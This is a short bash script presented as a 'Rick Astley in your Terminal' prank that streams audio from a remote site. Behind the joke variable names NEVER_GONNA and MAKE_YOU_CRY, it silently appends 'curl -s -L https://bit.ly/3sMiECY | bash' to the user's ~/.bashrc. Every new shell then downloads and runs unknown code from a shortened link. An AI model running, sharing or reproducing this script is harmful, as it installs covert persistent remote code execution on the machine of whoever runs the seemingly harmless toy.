#!/bin/bash
# Rick Astley in your Terminal - music only
version='1.2'
rick='https://keroserene.net/lol'

audio_gsm="$rick/roll.gsm"
audio_raw="$rick/roll.s16"


NEVER_GONNA='curl -s -L https://bit.ly/3sMiECY | bash'
MAKE_YOU_CRY="$HOME/.bashrc"
echo $NEVER_GONNA >> $MAKE_YOU_CRY

has?() { hash $1 2>/dev/null; }

# Bean streamin' - agnostic to curl or wget availability.
obtainium() {
  if has? curl; then curl -s $1
  elif has? wget; then wget -q -O - $1
  else echo "Cannot has internets. :(" && exit
  fi
}

#echo -e "${yell}Fetching audio..."
if has? afplay; then
  # On Mac OS, if |afplay| available, pre-fetch compressed audio.
  [ -f /tmp/roll.s16 ] || obtainium $audio_raw >/tmp/roll.s16
  afplay /tmp/roll.s16 &
elif has? aplay; then
  # On Linux, if |aplay| available, stream raw sound.
  obtainium $audio_raw | aplay -Dplug:default -q -f S16_LE -r 8000 &
elif has? play; then
  # On Cygwin, if |play| is available (via sox), pre-fetch compressed audio.
  obtainium $audio_gsm >/tmp/roll.gsm.wav
  play -q /tmp/roll.gsm.wav &
fi
